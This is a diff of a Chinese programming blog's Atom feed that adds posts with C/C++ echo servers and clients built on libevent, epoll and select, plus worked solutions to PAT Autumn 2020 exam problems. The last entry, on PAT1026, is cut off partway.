@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://yulangz.github.io</id>
     <title>语阑gz</title>
-    <updated>2021-08-06T10:11:14.371Z</updated>
+    <updated>2021-08-06T14:34:08.597Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://yulangz.github.io"/>
     <link rel="self" href="https://yulangz.github.io/atom.xml"/>
@@ -10,4 +10,2854 @@
     <logo>https://yulangz.github.io/images/avatar.png</logo>
     <icon>https://yulangz.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, 语阑gz</rights>
+    <entry>
+        <title type="html"><![CDATA[linux服务端--3. libevent实现回显服务器与客户端]]></title>
+        <id>https://yulangz.github.io/post/xdsvqq_rga2qz/</id>
+        <link href="https://yulangz.github.io/post/xdsvqq_rga2qz/">
+        </link>
+        <updated>2021-08-06T06:12:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="服务端">服务端</h2>
+<h3 id="severec">severe.c</h3>
+<pre><code class="language-c">// severe.c
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;event2/event.h&gt;
+#include &lt;event2/listener.h&gt;
+#include &lt;event2/bufferevent.h&gt;
+#include &quot;callbacks.h&quot;
+
+int main()
+{
+    // 创建event base
+    struct event_base* base = NULL;
+    base = event_base_new();
+    if(base == NULL){
+        perror(&quot;event base new error&quot;);
+        exit(1);
+    }
+
+    // 填写套接字地址
+    struct sockaddr_in saddr;
+    memset(&amp;saddr,0, sizeof(saddr));
+    saddr.sin_family = AF_INET;
+    saddr.sin_port = htons(9999);
+    saddr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    // 创建listern_cb回调函数的参数
+    struct CallBackArgs* args = malloc(sizeof(struct CallBackArgs));
+    args-&gt;base = base;
+
+    // 申请套接字、绑定、监听
+    struct evconnlistener* evl = NULL;
+    evl = evconnlistener_new_bind(base,
+                                  listen_cb,
+                                  (void *)args,
+                                  LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,
+                                  -1,
+                                  (struct sockaddr*)&amp;saddr,
+                                  sizeof(saddr));
+    if (evl == NULL){
+        perror(&quot;event listener new bind error&quot;);
+        exit(1);
+    }
+
+    // 开始运行
+    int code;
+    code = event_base_dispatch(base);
+    if(code == -1){
+        perror(&quot;event base dispatch error&quot;);
+        exit(1);
+    }
+
+    // 资源关闭
+    evconnlistener_free(evl);
+    free(args);
+    event_base_free(base);
+    return 0;
+}
+</code></pre>
+<h3 id="callbacksh">callbacks.h</h3>
+<pre><code class="language-c">// callbacks.h
+
+#ifndef CLIBEVENT_CALLBACKS_H
+#define CLIBEVENT_CALLBACKS_H
+
+#include &lt;event2/event.h&gt;
+#include &lt;event2/listener.h&gt;
+#include &lt;event2/bufferevent.h&gt;
+
+/* 自定义回调参数数据结构 */
+struct CallBackArgs
+{
+    struct event_base* base;
+};
+
+/** 监听listen回调函数
+ * type: evconnlistener_cb
+ * */
+void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
+               int socklen, void * args);
+
+/**
+   read回调函数
+   type: bufferevent_data_cb
+*/
+void read_cb(struct bufferevent *bfev, void *args);
+
+/**
+ * write回调函数
+ * type: bufferevent_data_cb
+ * */
+void write_cb(struct bufferevent *bfev, void *args);
+
+/**
+ * event回调函数
+ * type: bufferevent_event_cb
+ * */
+void event_cb(struct bufferevent *bfev, short what, void *args);
+
+#endif //CLIBEVENT_CALLBACKS_H
+
+</code></pre>
+<h3 id="callbacksc">callbacks.c</h3>
+<pre><code class="language-c">// callbacks.c
+
+#include &quot;callbacks.h&quot;
+#include &lt;string.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;stdlib.h&gt;
+void listen_cb(struct evconnlistener * evl, evutil_socket_t fd, struct sockaddr * caddr,
+        int socklen, void * args)
+{
+    // 获取参数
+    struct CallBackArgs* cb_args = (struct CallBackArgs*) args;
+
+    // 创建buffer event
+    struct bufferevent* bfev = NULL;
+    bfev = bufferevent_socket_new(cb_args-&gt;base,fd,BEV_OPT_CLOSE_ON_FREE);
+    if(bfev == NULL){
+        perror(&quot;buffer socket new error&quot;);
+        return;
+    }
+
+    // 启用读写事件
+    int code;
+    code = bufferevent_enable(bfev,EV_READ | EV_WRITE);
+    if(code == -1){
+        perror(&quot;buffer event enable error&quot;);
+        bufferevent_free(bfev);
+        return;
+    }
+
+    // 注册回调函数
+    bufferevent_setcb(bfev,
+                      read_cb,
+                      write_cb,
+                      event_cb,
+                      NULL);
+}
+
+void read_cb(struct bufferevent *bfev, void *args)
+{
+    //接收数据
+    char buff[1024] = {0};
+    int len = bufferevent_read(bfev,buff, sizeof(buff));
+    printf(&quot;接收到了数据:%s&quot;,buff);
+
+    // 处理数据
+    int i;
+    for(i = 0;i&lt;len ;++i){
+        buff[i] = toupper(buff[i]);
+    }
+
+    // 发送数据
+    int code;
+    code = bufferevent_write(bfev,buff, strlen(buff)+1);
+    if(code == -1){
+        perror(&quot;buffer write error&quot;);
+        return;
+    }
+    printf(&quot;我发回了数据:%s&quot;,buff);
+}
+
+void write_cb(struct bufferevent *bfev, void *args)
+{
+    printf(&quot;我的数据发送完毕\n&quot;);
+}
+
+void event_cb(struct bufferevent *bfev, short what, void *args)
+{
+    // 出现错误，释放资源，不做额外处理
+    if(args)
+        free(args);
+    bufferevent_free(bfev);
+    printf(&quot;关闭 buffer event\n&quot;);
+}
+</code></pre>
+<h2 id="客户端">客户端</h2>
+<pre><code class="language-c">// 发送一次数据并受到服务器返回后就退出event循环，结束程序
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;event2/event.h&gt;
+#include &lt;event2/bufferevent.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+void read_cb(struct bufferevent *bfev, void *args)
+{
+    char buff[1024] = {0};
+    int len = bufferevent_read(bfev, buff, sizeof(buff));
+    printf(&quot;从服务器接收到了数据:%s&quot;, buff);
+    bufferevent_free(bfev);
+}
+
+void write_cb(struct bufferevent *bfev, void *args)
+{
+    printf(&quot;数据已发送&quot;);
+}
+
+void event_cb(struct bufferevent *bfev, short what, void *args)
+{
+    if (what &amp; BEV_EVENT_CONNECTED)
+    {
+        printf(&quot;连接建立完成\n&quot;);
+        return;
+    }
+
+    if (what &amp; BEV_EVENT_ERROR)
+    {
+        printf(&quot;出现错误事件\n&quot;);
+        perror(&quot;&quot;);
+        if (args != NULL)
+            free(args);
+        bufferevent_free(bfev);
+        exit(1);
+    }
+    if (what &amp; BEV_EVENT_EOF)
+    {
+        printf(&quot;连接已断开\n&quot;);
+        if (args != NULL)
+            free(args);
+        bufferevent_free(bfev);
+        exit(0);
+    }
+}
+
+void std_cb(evutil_socket_t fd, short what, void *sock_bev)
+{
+    char buff[1024] = {0};
+    int len = read(fd, buff, sizeof(buff));
+    struct bufferevent *bev = (struct bufferevent *)sock_bev;
+    int code;
+    code = bufferevent_write(bev, buff, strlen(buff) + 1);
+    if (code == -1)
+    {
+        perror(&quot;write to buffer event error&quot;);
+        exit(1);
+    }
+}
+
+int main()
+{
+    struct event_base *base = NULL;
+    base = event_base_new();
+    if (base == NULL)
+    {
+        perror(&quot;base new error&quot;);
+        exit(1);
+    }
+
+    // 要连接的服务器信息
+    struct sockaddr_in serv;
+    memset(&amp;serv, 0, sizeof(serv));
+    serv.sin_family = AF_INET;
+    serv.sin_port = htons(9999);
+    inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;serv.sin_addr.s_addr);
+
+    // 创建套接字
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd &lt; 0)
+    {
+        perror(&quot;create socket erroe&quot;);
+        exit(1);
+    }
+    printf(&quot;套接字创建完成\n&quot;);
+    // 创建本次通信的bufferevent
+    struct bufferevent *bev = NULL;
+    bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);
+
+    int code;
+    code = bufferevent_socket_connect(bev, (struct sockaddr *)&amp;serv, sizeof(serv));
+    if (code == -1)
+    {
+        perror(&quot;connect error&quot;);
+        exit(1);
+    }
+
+    bufferevent_setcb(bev, read_cb, write_cb, event_cb, NULL);
+
+    code = bufferevent_enable(bev, EV_READ | EV_WRITE);
+    if (code == -1)
+    {
+        perror(&quot;enable error&quot;);
+        exit(1);
+    }
+
+    // 创建std输入事件
+    struct event *ev = NULL;
+    ev = event_new(base, STDIN_FILENO, EV_READ, std_cb, (void *)bev);
+    if (ev == NULL)
+    {
+        perror(&quot;创建std event error&quot;);
+        exit(1);
+    }
+
+    code = event_add(ev, NULL);
+    if (code == -1)
+    {
+        perror(&quot;event add error&quot;);
+        exit(1);
+    }
+    // 开始运行
+    code = event_base_dispatch(base);
+    if (code == -1)
+    {
+        perror(&quot;dispatch error&quot;);
+        exit(1);
+    }
+    //printf(&quot;event base start\n&quot;);
+
+    event_base_free(base);
+    printf(&quot;event base free\n&quot;);
+    return 0;
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[linux服务端--2. epoll 实现回显服务器]]></title>
+        <id>https://yulangz.github.io/post/xdsvqq_xthbax/</id>
+        <link href="https://yulangz.github.io/post/xdsvqq_xthbax/">
+        </link>
+        <updated>2021-08-06T06:10:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="代码">代码</h2>
+<pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;sys/epoll.h&gt;
+
+int main()
+{
+    int lfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (lfd == -1)
+    {
+        perror(&quot;socket error&quot;);
+        exit(1);
+    }
+
+    //设置端口复用
+    int opt = 1;
+    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;opt, sizeof(opt));
+
+    struct sockaddr_in serv_addr;
+    memset(&amp;serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(9317);
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    int ret = bind(lfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
+    if (ret == -1)
+    {
+        perror(&quot;bind error&quot;);
+        exit(1);
+    }
+
+    ret = listen(lfd, 64);
+    if (ret == -1)
+    {
+        perror(&quot;listen error&quot;);
+        exit(1);
+    }
+
+    struct sockaddr_in client_addr;
+    socklen_t cli_addr_len = sizeof(struct sockaddr_in);
+
+    //
+    struct epoll_event events[2000];
+
+    // 创建epoll实例
+    int epfd = epoll_create(2000);
+
+    //把监听事件挂到epoll红黑树上
+    struct epoll_event event_l;
+    event_l.events = EPOLLIN;
+    event_l.data.fd = lfd;
+    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, lfd, &amp;event_l)) &lt; 0)
+    {
+        fprintf(stderr, &quot;epoll ctl error: %s\n&quot;, strerror(errno));
+        exit(1);
+    }
+
+    while (1)
+    {
+        // 有事件发送的epoll_event结构体会复制到events上，ret为事件总数
+        int ret = epoll_wait(epfd, events, sizeof(events) / sizeof(events[0]), -1);
+        if (ret &lt; 0)
+        {
+            fprintf(stderr, &quot;epoll wait error: %s\n&quot;, strerror(errno));
+            exit(1);
+        }
+
+        int k;
+        for (k = 0; k &lt; ret; k++)
+        {
+            // 读事件
+            if (events[k].events &amp; EPOLLIN)
+            {
+                // tfd: this fd
+                int tfd = events[k].data.fd;
+
+                if (tfd == lfd)
+                {
+                    // 处理监听套接字的事件
+                    int cfd = accept(lfd, (struct sockaddr *)&amp;client_addr, &amp;cli_addr_len);
+                    if (cfd &lt; 0)
+                    {
+                        fprintf(stderr, &quot;accept error: %s\n&quot;, strerror(errno));
+                    }
+
+                    // 把客户端fd挂到epoll红黑树上
+                    struct epoll_event tmp;
+                    tmp.events = EPOLLIN;
+                    tmp.data.fd = cfd;
+                    if ((epoll_ctl(epfd, EPOLL_CTL_ADD, cfd, &amp;tmp)) &lt; 0)
+                    {
+                        fprintf(stderr, &quot;epoll ctl error: %s\n&quot;, strerror(errno));
+                        exit(1);
+                    }
+                }
+                else
+                {
+                    // 客户端fd的事件
+                    char buff[1024];
+                    int rec_len, i;
+                    if ((rec_len = recv(tfd, buff, sizeof(buff), 0)) &lt; 0)
+                    {
+                        fprintf(stderr, &quot;read error: %s\n&quot;, strerror(errno));
+                        exit(1);
+                    }
+                    else if (rec_len == 0)
+                    {
+                        // 客户端关闭连接
+                        if ((epoll_ctl(epfd, EPOLL_CTL_DEL, tfd, NULL)) &lt; 0)
+                        {
+                            fprintf(stderr, &quot;epoll ctl error: %s\n&quot;, strerror(errno));
+                            exit(1);
+                        }
+                        close(tfd);
+                    }
+                    else
+                    {
+                        printf(&quot;%s&quot;, buff);
+                        for (i = 0; i &lt; rec_len; ++i)
+                        {
+                            buff[i] = toupper(buff[i]);
+                        }
+                        send(tfd, buff, rec_len, 0);
+                    }
+                }
+            }
+        }
+    }
+    close(epfd);
+    close(lfd);
+    return 0;
+}
+</code></pre>
+<h2 id="epoll的一点小问题">epoll的一点小问题</h2>
+<p>如果某个fd被关闭，并且这次关闭是真正地释放了资源，而不是减少引用技术，那么这个fd会自动从eopll中删除，这时再调用epoll_ctl(EPOLL_CTL_DEL)可能会报错。</p>
+<blockquote>
+<pre><code>   Q6  Will closing a file descriptor cause it  to  be  removed  from  all
+</code></pre>
+</blockquote>
+<pre><code>       epoll sets automatically?
+
+   A6  Yes,  but  be aware of the following point.  A file descriptor is a
+       reference to an open file description (see  [open(2)](http://man.he.net/man2/open)).   Whenever  a
+       descriptor  is duplicated via [dup(2)](http://man.he.net/man2/dup), [dup2(2)](http://man.he.net/man2/dup2), [fcntl(2)](http://man.he.net/man2/fcntl) F_DUPFD, or
+       [fork(2)](http://man.he.net/man2/fork), a new file descriptor referring  to  the  same  open  file
+       description  is  created.   An  open  file description continues to
+       exist until all file descriptors referring to it have been  closed.
+       A  file  descriptor is removed from an epoll set only after all the
+       file descriptors referring to the underlying open file  description
+       have been closed (or before if the descriptor is explicitly removed
+       using [epoll_ctl(2)](http://man.he.net/man2/epoll_ctl) EPOLL_CTL_DEL).  This means that  even  after  a
+       file  descriptor  that  is  part  of  an epoll set has been closed,
+       events may be reported for  that  file  descriptor  if  other  file
+       descriptors  referring  to  the  same  underlying  file description
+       remain open.
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[linux服务端--1. select实现回显服务器]]></title>
+        <id>https://yulangz.github.io/post/xdsvqq_ymoehs/</id>
+        <link href="https://yulangz.github.io/post/xdsvqq_ymoehs/">
+        </link>
+        <updated>2021-08-06T06:08:19.000Z</updated>
+        <content type="html"><![CDATA[<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ctype.h&gt;
+#include &lt;sys/select.h&gt;
+
+int main()
+{
+    // 创建监听套接字
+    int lfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (lfd == -1)
+    {
+        perror(&quot;socket error&quot;);
+        exit(1);
+    }
+
+    // 设置端口复用
+    int opt = 1;
+    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&amp;opt, sizeof(opt));
+
+    //IP地址与端口号信息
+    struct sockaddr_in serv_addr;
+    memset(&amp;serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(9317);
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    // 绑定、监听
+    int ret = bind(lfd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
+    if (ret == -1)
+    {
+        perror(&quot;bind error&quot;);
+        exit(1);
+    }
+
+    ret = listen(lfd, 64);
+    if (ret == -1)
+    {
+        perror(&quot;listen error&quot;);
+        exit(1);
+    }
+
+    // 用来接收客户端ip信息
+    struct sockaddr_in client_addr;
+    socklen_t cli_addr_len = sizeof(struct sockaddr_in);
+
+    // select用的两个事件数组
+    fd_set reads, temps;
+    // 最大的事件fd
+    int max_fd;
+    // 初始化reads事件表
+    FD_ZERO(&amp;reads);
+    // 设置内核监视监听套接字
+    FD_SET(lfd, &amp;reads);
+    max_fd = lfd;
+
+    while (1)
+    {
+        // 复制reads表传参，保留原reads表不变，因为select会修改传进去的表
+        temps = reads;
+
+        int ret = select(max_fd + 1, &amp;temps, NULL, NULL, NULL);
+        if (ret &lt; 0)
+        {
+            fprintf(stderr, &quot;select error: %s\n&quot;, strerror(errno));
+            exit(1);
+        }
+
+        // 监听套接字有事件
+        if (FD_ISSET(lfd, &amp;temps))
+        {
+            int cfd;
+            if ((cfd = accept(lfd, (struct sockaddr *)&amp;client_addr, &amp;cli_addr_len)) &lt; 0)
+            {
+                fprintf(stderr, &quot;accept error: %s\n&quot;, strerror(errno));
+                exit(1);
+            }
+            // 新套接字（客户套接字）加入reads表
+            FD_SET(cfd, &amp;reads);
+            max_fd = max_fd &gt; cfd ? max_fd : cfd;
+        }
+        int k;
+        for (k = lfd + 1; k &lt;= max_fd; k++)
+        {
+            // 客户端有事件，处理
+            if (FD_ISSET(k, &amp;temps))
+            {
+                char buff[1024];
+                int rec_len, i;
+                if ((rec_len = recv(k, buff, sizeof(buff), 0)) &lt; 0)
+                {
+                    fprintf(stderr, &quot;read error: %s\n&quot;, strerror(errno));
+                    exit(1);
+                }
+                else if (rec_len == 0)
+                {
+                    // 客户端关闭连接
+                    close(k);
+                    FD_CLR(k, &amp;reads);
+                }
+                else
+                {
+                    for (i = 0; i &lt; rec_len; ++i)
+                    {
+                        buff[i] = toupper(buff[i]);
+                    }
+                    send(k, buff, rec_len, 0);
+                }
+            }
+        }
+    }
+    close(lfd);
+    return 0;
+}
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PAT 2020年秋考解答]]></title>
+        <id>https://yulangz.github.io/post/sw67dr_kb5gab/</id>
+        <link href="https://yulangz.github.io/post/sw67dr_kb5gab/">
+        </link>
+        <updated>2021-08-06T05:52:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="7-1-panda-and-pp-milk-20分">7-1 Panda and PP Milk (20分)</h3>
+<p>这道题杀死了不少同学的心态，但是如果想到方法了就特别简单。<br>
+简单说下做法，一共对全表进行两次扫描，第一次从左到右，第二次从右到左，每次扫描时，如果后面熊猫比前面重，则供奶量+1（以2、3、4计，最后统一乘100)如果体重持平，则保持不变，体重减轻，则供奶量恢复为2，从左向右扫描满足所有熊猫看到自己左边的熊猫都会满意，从右向左满足右边熊猫，对每个熊猫取两次扫描中的较大值，即为答案。</p>
+<table>
+<thead>
+<tr>
+<th>体重</th>
+<th>180</th>
+<th>160</th>
+<th>100</th>
+<th>150</th>
+<th>145</th>
+<th>142</th>
+<th>138</th>
+<th>138</th>
+<th>140</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>左向右</td>
+<td>2</td>
+<td>2</td>
+<td>2</td>
+<td>3</td>
+<td>2</td>
+<td>2</td>
+<td>2</td>
+<td>2</td>
+<td>3</td>
+</tr>
+<tr>
+<td>右向左</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>5</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>2</td>
+<td>2</td>
+</tr>
+<tr>
+<td>最终供奶量</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>5</td>
+<td>4</td>
+<td>3</td>
+<td>2</td>
+<td>2</td>
+<td>3</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
+
+using namespace std;
+
+const int NMAX = 10005;
+const int WMAX = 205;
+
+int main() {
+    int n, wight[NMAX], milk_l[NMAX], milk_r[NMAX];
+    cin &gt;&gt; n;
+    for (int i = 0; i &lt; n; i++) {
+        cin &gt;&gt; wight[i];
+    }
+    int pre, now_milk;
+    now_milk = 2;
+    pre = WMAX;
+    for (int i = 0; i &lt; n; i++) {
+        // 左向右扫
+        if (wight[i] &gt; pre) {
+            now_milk++;
+        } else if (wight[i] == pre) { ; //体重相等供奶量保持不变
+        } else {
+            now_milk = 2;
+        }
+        milk_l[i] = now_milk;
+        pre = wight[i];
+    }
+
+    now_milk = 2;
+    pre = WMAX;
+    for (int i = n - 1; i &gt;= 0; i--) {
+        // 右向左扫
+        if (wight[i] &gt; pre) {
+            now_milk++;
+        } else if (wight[i] == pre) { ;
+        } else {
+            now_milk = 2;
+        }
+        milk_r[i] = now_milk;
+        pre = wight[i];
+    }
+    int sum = 0;
+    for (int i = 0; i &lt; n; i++) {
+        sum += max(milk_l[i], milk_r[i]); // 取较大者
+    }
+    cout &lt;&lt; sum * 100;
+    return 0;
+}
+</code></pre>
+<p>至于这题是怎么想到的？我也不知道。可能是考场上的灵光一现吧，要是换个时间再来一次，我可能也想不到这样做了。</p>
+<h3 id="7-2-how-many-ways-to-buy-a-piece-of-land-25分">7-2 How Many Ways to Buy a Piece of Land (25分)</h3>
+<p>比较简单</p>
+<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
+
+using namespace std;
+
+const int NMAX = 10005;
+
+int main() {
+    int n, m;
+    int pieces[NMAX];
+    cin &gt;&gt; n &gt;&gt; m;
+    for (int i = 0; i &lt; n; i++) {
+        cin &gt;&gt; pieces[i];
+    }
+    int ans = 0;
+    int i = 0, j = 0;
+    int total = 0;
+    while (i &lt; n) {
+        while (j &lt; n &amp;&amp; total + pieces[j] &lt;= m) {
+            total += pieces[j++];
+        }
+        ans += j - i;
+        total -= pieces[i++];
+    }
+    cout &lt;&lt; ans;
+    return 0;
+}
+</code></pre>
+<h3 id="7-3-left-view-of-binary-tree-25分">7-3 Left-View of Binary Tree (25分)</h3>
+<p>先建树，再层序遍历，考基本功了</p>
+<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
+
+using namespace std;
+
+const int NMAX = 25;
+
+struct TNode {
+    int val;
+    int level;
+    TNode *left;
+    TNode *right;
+};
+
+int pre[NMAX], in[NMAX];
+
+TNode *new_node(int val) {
+    TNode *node = new TNode;
+    node-&gt;val = val;
+    node-&gt;level = -1;
+    node-&gt;left = node-&gt;right = nullptr;
+    return node;
+}
+
+TNode *built_tree(int in_s, int in_e, int pre_s, int pre_e) {
+    if (in_s &gt; in_e)
+        return nullptr;
+    int mid;
+    for (mid = in_s; mid &lt;= in_e; mid++) {
+        if (in[mid] == pre[pre_s])
+            break;
+    }
+
+    TNode *node = new_node(pre[pre_s]);
+    node-&gt;left = built_tree(in_s, mid - 1, pre_s + 1, pre_s + mid - in_s);
+    node-&gt;right = built_tree(mid + 1, in_e, pre_s + mid - in_s + 1, pre_e);
+    return node;
+}
+
+
+vector&lt;int&gt; ans;
+
+void level_travel(TNode *node) {
+    queue&lt;TNode *&gt; q;
+    int now_level = 0;
+    node-&gt;level = 1;
+    q.push(node);
+    while (!q.empty()) {
+        node = q.front();
+        q.pop();
+        if (node-&gt;level != now_level) {
+            ans.push_back(node-&gt;val);
+            now_level = node-&gt;level;
+        }
+
+        if (node-&gt;left) {
+            node-&gt;left-&gt;level = node-&gt;level + 1;
+            q.push(node-&gt;left);
+        }
+        if (node-&gt;right) {
+            node-&gt;right-&gt;level = node-&gt;level + 1;
+            q.push(node-&gt;right);
+        }
+    }
+}
+
+int main() {
+    int n;
+    cin &gt;&gt; n;
+    for (int i = 0; i &lt; n; i++) {
+        cin &gt;&gt; in[i];
+    }
+    for (int i = 0; i &lt; n; i++) {
+        cin &gt;&gt; pre[i];
+    }
+    TNode *root = built_tree(0, n - 1, 0, n - 1);
+
+    level_travel(root);
+    int l = ans.size();
+    if (l &gt; 0) {
+        cout &lt;&lt; ans[0];
+    }
+    for (int i = 1; i &lt; l; i++) {
+        cout &lt;&lt; &quot; &quot; &lt;&lt; ans[i];
+    }
+    return 0;
+}
+</code></pre>
+<h3 id="7-4-professional-ability-test-30分">7-4 Professional Ability Test (30分)</h3>
+<p>先判断是否有环（推荐拓扑排序，DFS也许），然后djs算法，纯考基本功，代码量有点大</p>
+<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
+
+using namespace std;
+
+const int NMAX = 1005;
+const int MAX_DIS = 500;
+
+struct Edge {
+    int v;
+    int score, daijinquan;
+
+    Edge() {};
+
+    Edge(int _v, int _score, int _daijinquan) {
+        v = _v;
+        score = _score;
+        daijinquan = _daijinquan;
+    }
+};
+
+vector&lt;Edge&gt; graph[NMAX];
+int in[NMAX], in_buff[NMAX];
+int n, m;
+
+void not_consist() {
+    // 有环，直接判断
+    cout &lt;&lt; &quot;Impossible.&quot; &lt;&lt; endl;
+    int k;
+    cin &gt;&gt; k;
+    while (k--) {
+        int node;
+        cin &gt;&gt; node;
+        if (in[node] == 0)
+            printf(&quot;You may take test %d directly.
+&quot;, node);
+        else
+            printf(&quot;Error.
+&quot;);
+    }
+}
+
+//vector&lt;int&gt; pre[NMAX];
+int pre[NMAX];
+
+void Dijkstra() {
+    bool visited[NMAX];
+    int dis_score[NMAX];
+    int dis_daijinquan[NMAX];
+    fill(visited, visited + NMAX, false);
+    fill(dis_score, dis_score + NMAX, MAX_DIS);
+    fill(dis_daijinquan, dis_daijinquan + NMAX, 0);
+    //dis_score[n]=0;
+    //int node;
+    for (Edge e:graph[n]) {
+        dis_score[e.v] = dis_daijinquan[e.v] = 0;
+        pre[e.v] = n;
+    }
+    while (true) {
+        int min_node = n;
+        int min_dis = MAX_DIS;
+        for (int i = 0; i &lt; n; i++) {
+            if (visited[i])
+                continue;
+
+            if (dis_score[i] &lt; min_dis) {
+                min_dis = dis_score[i];
+                min_node = i;
+            } else if (dis_score[i] == min_dis) {
+                if (dis_daijinquan[i] &gt; dis_daijinquan[min_node])
+                    min_node = i;
+            }
+        }
+        if (min_node == n)
+            break;
+        visited[min_node] = true;
+        for (Edge e:graph[min_node]) {
+            if (min_dis + e.score &lt; dis_score[e.v]) {
+                pre[e.v] = min_node;
+                dis_score[e.v] = min_dis + e.score;
+                dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
+            } else if (min_dis + e.score == dis_score[e.v]) {
+                if (dis_daijinquan[min_node] + e.daijinquan &gt; dis_daijinquan[e.v]) {
+                    pre[e.v] = min_node;
+                    dis_daijinquan[e.v] = dis_daijinquan[min_node] + e.daijinquan;
+                }
+            }
+        }
+    }
+}
+
+void consist() {
+    // 无环 Djs算法
+    cout &lt;&lt; &quot;Okay.&quot; &lt;&lt; endl;
+    Dijkstra();
+    int k;
+    cin &gt;&gt; k;
+    for (int i = 0; i &lt; k; i++) {
+        int dst;
+        cin &gt;&gt; dst;
+
+        if (pre[dst] == n) {
+            printf(&quot;You may take test %d directly.
+&quot;, dst);
+        } else {
+            vector&lt;int&gt; path;
+            while (dst != n) {
+                path.push_back(dst);
+                dst = pre[dst];
+            }
+            int l = path.size();
+            printf(&quot;%d&quot;, path[l - 1]);
+            for (int j = l - 2; j &gt;= 0; j--) {
+                printf(&quot;-&gt;%d&quot;, path[j]);
+            }
+            printf(&quot;
+&quot;);
+        }
+    }
+}
+
+bool check() {
+    // 判断是否有环
+    bool visited[NMAX];
+    fill(visited, visited + NMAX, false);
+    for (int i = 0; i &lt; n; i++) {
+        int node = 0;
+        for (; node &lt; n; node++) {
+            if (!visited[node] &amp;&amp; in[node] == 0) {
+                break;
+            }
+        }
+        if (node == n)
+            break;
+        visited[node] = true;
+        for (Edge t:graph[node]) {
+            in[t.v]--;
+        }
+    }
+    for (int i = 0; i &lt; n; i++) {
+        if (in[i])
+            return false;
+    }
+    return true;
+}
+
+int main() {
+
+    cin &gt;&gt; n &gt;&gt; m;
+    for (int i = 0; i &lt; m; i++) {
+        int u, v, s, d;
+        cin &gt;&gt; u &gt;&gt; v &gt;&gt; s &gt;&gt; d;
+        in[v]++;
+        in_buff[v]++;// 入读保存两份，一份用来判环，一份判断是否是启示节点（一开始入读就是0的节点）
+        graph[u].push_back(Edge(v, s, d));
+    }
+
+    for (int i = 0; i &lt; n; i++) {
+        if (in[i] == 0) {
+            // 用节点n作为总起始节点，连接所有起始入度为零的节点，将图变成单源的
+            graph[n].push_back(Edge(i, 0, 0));
+        }
+    }
+    if (check())
+        consist();
+    else
+        not_consist();
+    return 0;
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PAT1026 Table Tennis (30分)时间戳法]]></title>
+        <id>https://yulangz.github.io/post/sw67dr_iy8tyk/</id>
+        <link href="https://yulangz.github.io/post/sw67dr_iy8tyk/">
+        </link>
+        <updated>2021-08-06T05:50:59.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://pintia.cn/problem-sets/994805342720868352/problems/994805472333250560">题目链接</a><br>
+题目不难读懂，并且不涉及什么算法，但是逻辑上非常繁琐，算法笔记上有非常详细的题意解释，这里就不赘述了。</p>
+<p>这里主要是写我用的一种模拟时间滴答的方法，逻辑上可能要简单一些。<br>
